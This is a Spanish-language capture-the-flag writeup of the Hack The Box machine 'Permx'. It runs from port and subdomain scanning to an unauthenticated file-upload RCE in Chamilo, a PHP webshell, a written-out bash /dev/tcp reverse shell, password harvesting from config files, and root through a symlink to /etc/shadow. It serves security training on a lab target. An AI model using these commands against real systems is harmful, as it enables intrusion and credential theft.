<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Permx</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Permx</h1><br/><p>Escaneo de puertos</p><p></p><p>	<strong>nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN permx_scan 10.10.11.23</strong></p><p></p><p>Puertos 22 (SSH) y 80 (HTTP) abiertos</p><p></p><p><img src="images/128-1.png" alt="images/128-1.png" /></p><p></p><p>Añadido a /etc/hosts</p><p></p><p>Como directorios encuentro esto</p><p></p><p><img src="images/128-2.png" alt="images/128-2.png" /></p><p></p><p>	<strong>whatweb </strong><strong><a href="http://permx.htb:80/">http://permx.htb:80/</a></strong>	</p><p>	<a href="http://permx.htb:80/">http://permx.htb:80/</a> [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[permx@htb.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.23], 				JQuery[3.4.1], Script, Title[eLEARNING]</p><p>     </p><p>Encuentro 2 subdominios</p><p></p><p>	<strong>ffuf -u </strong><strong><a href="http://permx.htb/">http://permx.htb/</a></strong><strong> -H &quot;Host: FUZZ.permx.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200 -s</strong></p><p></p><p><img src="images/128-3.png" alt="images/128-3.png" /></p><p></p><p></p><p><img src="images/128-4.png" alt="images/128-4.png" /></p><p></p><p>En lms.permx.htb encuentro un login</p><p></p><p><img src="images/128-5.png" alt="images/128-5.png" /></p><p></p><p>Es la versión 1 de Chamilo</p><p></p><p>Chamilo  es vulnearable a es vulnerable a Unauthenticated  Upload File RCE</p><p></p><p>Encuentro un POC</p><p></p><p><a href="https://starlabs.sg/advisories/23/23-4220/">https://starlabs.sg/advisories/23/23-4220/</a></p><p></p><p>Tendré que crear un rce en php </p><p></p><p><img src="images/128-6.png" alt="images/128-6.png" /></p><p></p><p>Subimos el archivo con curl</p><p></p><p><img src="images/128-7.png" alt="images/128-7.png" /></p><p></p><p>Le envio una solicitud para ver si funcionó</p><p></p><p><img src="images/128-8.png" alt="images/128-8.png" /></p><p></p><p>Ahora envio el condigo para el reverse shell </p><p></p><p>	<strong>bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1&quot;</strong></p><p></p><p>Lo tengo que encodear para poder mandarlo en la url y lo entienda</p><p></p><p>Obtengo el shell, estamos como el usuario www-data</p><p></p><p><img src="images/128-9.png" alt="images/128-9.png" /></p><p></p><p>Veo que existe el usuario mtz pero no puedo acceder a el</p><p><img src="images/128-10.png" alt="images/128-10.png" /></p><p></p><p>El siguiente paso sería acceder al usuario mtz y desde ahí escalar privilegios</p><p></p><p>encontramos la ruta /var/www/chamilo/app/config que puede contener datos interesantes</p><p></p><p>Con el comando <strong>cat * | grep &quot;pass&quot;</strong> hago que se me muestre todas las lineas que contienen la palabra pass de todos los archivos del directorio actual</p><p></p><p>Encontramos unas password de una db</p><p></p><p><img src="images/128-11.png" alt="images/128-11.png" /></p><p></p><p>Intento usar esta pass para el usuario mtz</p><p></p><p>Consigo la conexión con el usuario mtz a través de SSH</p><p></p><p><img src="images/128-12.png" alt="images/128-12.png" /></p><p></p><p>Con sudo -l veo que puedo ejecutar</p><p></p><p><img src="images/128-13.png" alt="images/128-13.png" /></p><p></p><p>Veo lo que hace  esta script como administrador</p><p></p><p><img src="images/128-14.png" alt="images/128-14.png" /></p><p></p><p>La script sirve para  dar permisos a un archivo dentro de  la ruta /home/mtz/*</p><p></p><p>La idea sería cambiar los permisos de /etc/shadow para poder ver el hash del root</p><p></p><p>Pero como no podemos lo más probable es que tengamos que crear un enlacen  simbólico en el home de mtz hacia el archivo que quiero ver o modificar</p><p></p><p><img src="images/128-15.png" alt="images/128-15.png" /></p><p></p><p>Editamos el archivo shadow para quitarle la pass a root</p><p></p><p><img src="images/128-16.png" alt="images/128-16.png" /></p><p></p><p><img src="images/128-17.png" alt="images/128-17.png" /></p><p></p><p>Al quitarle la  password podemos entrar como root</p><p></p><p><img src="images/128-18.png" alt="images/128-18.png" /></p></div>
</body>
</html>
